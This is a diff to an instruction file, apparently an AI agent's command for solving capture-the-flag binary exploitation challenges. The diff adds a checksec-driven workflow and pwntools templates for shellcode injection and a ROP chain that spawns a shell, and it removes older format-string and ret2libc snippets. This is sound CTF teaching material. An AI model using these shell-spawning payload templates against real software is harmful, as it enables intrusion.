@@ -28,105 +28,62 @@ Use this command for challenges involving:
 ## Bundled Scripts
 
 - [check-tools.sh](scripts/check-tools.sh) — Verify required pwn tools are installed
-- [run-checksec.sh](scripts/run-checksec.sh) — Check binary protections (CANARY, NX, PIE, RELRO)
+- [run-checksec.sh](scripts/run-checksec.sh) — Check binary protections (CANARY, NX, PIE, RELRO). Outputs JSON with protection status, attack vectors, and suggested exploitation strategy.
 
 ## Instructions
 
 1. First check tool availability: `bash scripts/check-tools.sh`
 
-2. Run the pwn analysis:
+2. **Start with checksec** to understand binary protections:
 
    ```bash
-   ctf run pwn $ARGUMENTS
+   bash scripts/run-checksec.sh $ARGUMENTS
    ```
 
-2. Check binary protections:
+   The JSON output includes:
+   - `protections`: status of each protection (enabled/disabled/partial)
+   - `attack_vectors`: viable exploitation approaches
+   - `suggestions[0]`: recommended exploitation STRATEGY based on protections
 
-   ```bash
-   checksec ./binary
+   Example: if `stack_canary=disabled` and `nx=disabled`, the strategy is "Classic buffer overflow with shellcode injection".
+
+3. Based on checksec JSON, proceed with exploitation:
+
+   **No Canary + No NX (shellcode):**
+   ```python
+   from pwn import *
+   p = process('./binary')
+   shellcode = asm(shellcraft.sh())
+   payload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)
+   p.sendline(payload)
+   p.interactive()
    ```
 
-   | Protection | If Disabled |
-   |------------|-------------|
-   | CANARY | Stack overflow exploitable |
-   | NX | Shellcode injection possible |
-   | PIE | Fixed addresses for ROP |
-   | RELRO | GOT overwrite possible |
-
-3. Find ROP gadgets:
-
+   **No Canary + NX + No PIE (ROP):**
    ```bash
-   # Find all gadgets
-   ROPgadget --binary ./binary
-
-   # Find specific gadgets
    ROPgadget --binary ./binary --re "pop rdi"
-
-   # For x64: need pop rdi; ret for first argument
-   # For x86: arguments on stack
+   ```
+   ```python
+   payload = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
    ```
 
-4. Dynamic analysis:
+   **PIE enabled (need leak):**
+   - Leak address via format string or partial overwrite
+   - Calculate base address
+   - Build ROP chain with calculated addresses
 
-   ```bash
-   # Run binary
-   ./binary
-
-   # Trace library calls
-   ltrace ./binary
-
-   # Trace system calls
-   strace ./binary
-
-   # Debug with GDB
-   gdb ./binary
-   ```
-
-5. Find offset to return address:
+4. Find offset to return address:
 
    ```python
-   # Generate pattern
    from pwn import *
    print(cyclic(200))
-
-   # Find offset after crash
-   cyclic_find(0x61616161)  # Replace with crash value
+   # After crash: cyclic_find(0x61616161)
    ```
-
-## Common Attack Patterns
-
-### Buffer Overflow (No Canary, No PIE)
-
-```python
-from pwn import *
-p = process('./binary')
-payload = b'A' * offset + p64(win_function)
-p.sendline(payload)
-p.interactive()
-```
-
-### Format String
-
-```python
-# Leak stack values
-payload = b'%p ' * 20
-
-# Write to address
-payload = fmtstr_payload(offset, {target: value})
-```
-
-### ret2libc
-
-```python
-# Leak libc address
-# Calculate base
-# Call system("/bin/sh")
-```
 
 ## Exploitation Checklist
 
 1. Run binary, understand behavior
-2. Check protections with checksec
+2. `run-checksec.sh` → read JSON `attack_vectors`
 3. Find vulnerability (overflow, format string)
 4. Find offset to control
 5. Build exploit (shellcode or ROP)
